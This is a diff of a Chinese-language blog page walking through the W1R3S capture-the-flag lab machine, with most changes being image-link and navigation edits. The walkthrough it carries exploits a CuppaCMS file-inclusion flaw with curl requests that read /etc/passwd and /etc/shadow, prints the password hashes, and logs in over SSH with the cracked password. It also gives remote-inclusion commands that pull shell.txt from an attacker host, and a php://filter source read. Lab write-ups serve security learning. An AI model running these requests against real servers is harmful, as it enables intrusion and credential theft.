 <p><strong>然后下载该利用文件</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit cuppa -m 25971</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452046.png" alt="image-20260304201422657"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140500.png" alt="image-20260304201422657"></p>
 <p><strong>发现是****文件包含类型的漏洞</strong>，下面是漏洞所在目录和位置</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452047.png" alt="image-20260304201548959"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140501.png" alt="image-20260304201548959"></p>
 <p><strong>漏洞描述</strong>：攻击者可能利用此漏洞包含本地或远程的 PHP 文件，或读取非 PHP 文件。在创建将被包含到当前文件中的文件名时，使用了受污染的用户数据。该文件中的 PHP 代码将被执行，非 PHP 代码则会被嵌入到输出内容中。此漏洞可能导致服务器完全沦陷。</p>
 <p><strong>攻击方式</strong>：有远程文件包含和本地文件包含（或者说任意文件的读取），               还可以通过 php 的字节流访问 php 的源码</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452048.png" alt="image-20260304201729643"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140502.png" alt="image-20260304201729643"></p>
 <p><strong>最简单最方便的肯定是本地文件包含</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.138/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452049.png" alt="image-20260304203057990"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140503.png" alt="image-20260304203057990"></p>
 <p><strong>发现 NOT FOUND 难道是 poc 有问题吗？？？</strong></p>
 <p><strong>并不是，回过头去看我们目录扫描结果可知，我们一共扫出来三个目录，而上面的目录为</strong><strong>&#x2F;cuppa</strong> 就是错误原因！</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.168.138/javascript/">http://192.168.168.138/javascript/</a></p>
@@ -668,75 +668,75 @@
 <p><a target="_blank" rel="noopener" href="http://192.168.168.138/administrator/">http://192.168.168.138/administrator/</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.138/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452050.png" alt="image-20260304203411049"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140504.png" alt="image-20260304203411049"></p>
 <p><strong>发现没报错，也没有可见结果。检查源代码也没有我们想见的 passwd 信息，这又该怎么办？</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452051.png" alt="image-20260304203511393"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140505.png" alt="image-20260304203511393"></p>
 <p><strong>分析：”urlConfig”是作为一个参数给过来的，一般来说，作为参数是用 get 方式来处理数据的，但不一定。有没有可能是 post</strong></p>
 <p><strong>而漏洞利用里面有使用 base64 编码的内容</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452052.png" alt="image-20251022200958080"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140506.png" alt="image-20251022200958080"></p>
 <p><strong>可以猜测是 post，要不你也可以下载漏洞利用里面给的第三方源码进行代码审计或者自己****去网上搜 cuppaCMS 的源码然后代码审计</strong></p>
 <p><strong>我们在之前确定了漏洞位置，22 行</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452053.png" alt="image-20251022201350355"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140507.png" alt="image-20251022201350355"></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/CuppaCMS/CuppaCMS/blob/master/alerts/alertConfigField.php">CuppaCMS&#x2F;alerts&#x2F;alertConfigField.php at master · CuppaCMS&#x2F;CuppaCMS · GitHub</a>                 <strong>源码地址</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452054.png" alt="image-20260304204430237"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140508.png" alt="image-20260304204430237"></p>
 <p><strong>可以看到关键词搜索，确实是 POST 不做任何处理来处理数据的</strong></p>
 <p>**还是多种方法，**<strong>burpsuit 抓包，hackerbar，也可以用命令行工具 curl</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452055.png" alt="image-20251022201844385"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140509.png" alt="image-20251022201844385"></p>
 <p><strong>这里用</strong><code>curl</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --help all | grep url                  #搜索curl中的有关url的帮助，不加grep太多了</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452056.png" alt="image-20260304204939646"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140510.png" alt="image-20260304204939646"></p>
 <p><strong>发现第一个与 URL 的 POST 相关。</strong></p>
 <p><strong>其实跟 hackerbar 很类似</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode &quot;urlConfig=../../../../../../../../../etc/passwd&quot; http://192.168.168.138/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452057.png" alt="image-20260304205352842"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140511.png" alt="image-20260304205352842"></p>
 <p><strong>利用成功</strong></p>
 <p><strong>接下来看看能否读取最重要的****shadow</strong> 文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode &quot;urlConfig=../../../../../../../../../etc/shadow&quot; http://192.168.168.138/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452058.png" alt="image-20260304205609750"><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452059.png" alt="image-20260304205556067"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140512.png" alt="image-20260304205609750"><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140513.png" alt="image-20260304205556067"></p>
 <p><strong>成功读取 root，www-data，w1r3s 三个账户的密码 hash 值</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">w1r3s:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br></pre></td></tr></table></figure>
 
 <p><strong>比较慢，可以多试几次</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452060.png" alt="image-20260304210436082"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140514.png" alt="image-20260304210436082"></p>
 <h2 id="获得初始-shell"><a href="#获得初始-shell" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><p><strong>我们现在相当于有了用户名和密码，如何登录呢？</strong></p>
 <p><strong>我们想到，nmap 扫描时 22 端口 ssh 是开放的，尝试连接靶机</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh w1r3s@192.168.168.138              密码是 computer</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452061.png" alt="image-20260304211135629"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140515.png" alt="image-20260304211135629"></p>
 <p><strong>ssh 连接成功</strong></p>
 <p><strong>查看该用户信息，确认是靶机没错</strong></p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452062.png" alt="image-20260304211254213"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140516.png" alt="image-20260304211254213"></p>
 <p><strong>查看 id 信息，发现有居然有****sudo</strong>			<strong>查看当前用户权限 <strong><code>sudo -l</code> 居然</strong>全是 ALL</strong>! 也就是说该用户<strong>具有管理员的所有权限</strong></p>
 <p><strong>运气很好，省去了****提权</strong>步骤</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452063.png" alt="image-20260304211445971"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140517.png" alt="image-20260304211445971"></p>
 <p><strong>找找</strong><code>flag</code></p>
 <p><strong>先切换到 root 用户</strong>	<code>sudo /bin/bash</code>	<strong># 这个命令用于****以 root 权限启动一个新的 Bash shell</strong>。</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131452064.png" alt="image-20260304212028853"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140518.png" alt="image-20260304212028853"></p>
 <p><strong>找找有没有</strong><code>flag</code>（不是所有靶机都有的，但共同目标都是获取其最高权限，即 roo 权限）</p>
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131357141.png" alt="image-20260304212221490"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140519.png" alt="image-20260304212221490"></p>
 <h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.138/administrator/alerts/alertConfigField.php?urlConfig=http://192.168.168.130/phpinfo.txt?</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131355467.png" alt="image-20260304213613547"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140520.png" alt="image-20260304213613547"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode &quot;urlConfig=http://192.168.168.130/phpinfo.txt&quot; http://192.168.168.138/administrator/alerts/alertConfigField.php</span><br><span class="line"></span><br><span class="line">curl -X POST \</span><br><span class="line">     -d &quot;urlConfig=http://attacker.com/shell.txt&quot; \</span><br><span class="line">     http://target/cuppa/alerts/alertConfigField.php</span><br><span class="line">curl -X POST \</span><br><span class="line">     -d &quot;urlConfig=http://192.168.168.130/shell.txt?&amp;test=hello&quot; \</span><br><span class="line">     http://192.168.168.138/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data-urlencode &quot;urlConfig=../../../../../../../../../etc/passwd&quot; http://192.168.168.138/administrator/alerts/alertConfigField.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131352771.png" alt="image-20260304201729643"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140502.png" alt="image-20260304201729643"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.168.138/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl --data-urlencode &quot;urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php&quot; http://192.168.168.138/administrator/alerts/alertConfigField.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://gitee.com/lmlsamas/picgo/raw/master/20260313131346507.png" alt="image-20260304221109099"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/LMLsama/picgo@main//images/20260313152140521.png" alt="image-20260304221109099"></p>
 <p><strong>文件确实被包含了，但 curl post 不显示结果，不知道为什么</strong></p>
 
     </article>
     
     <div class="read-nums">
       <!-- id 将作为查询条件 -->
-      <span id="2026/03/13/W1R3S/" class="leancloud_visitors" data-flag-title="Your Article Title">
+      <span id="2026/03/13/W/" class="leancloud_visitors" data-flag-title="Your Article Title">
         <em class="post-meta-item-text">浏览量</em>
         <i class="leancloud-visitors-count"></i>
       </span>
@@ -756,16 +756,11 @@
       </div>
       
         <div class="catelogue catelogue-2">
-          
-            <p>
-              <span>上一篇：</span>
-              <a href="/2026/03/13/W1R3S-github图床/">W1R3S-github图床+</a>
-            </p>
            
           
             <p>
               <span>下一篇</span>
-              <a href="/2026/03/13/hello-world/">Hello World</a>
+              <a href="/2026/03/13/W1R3S-github图床/">W1R3S-github图床+</a>
             </p>
           
         </div>
@@ -787,7 +782,7 @@
     recordIP: config.recordIP,
     visitor: config.visitor,
     enableQQ: config.enableQQ,
-    path: '2026/03/13/W1R3S/'
+    path: '2026/03/13/W/'
   })
 </script>
 
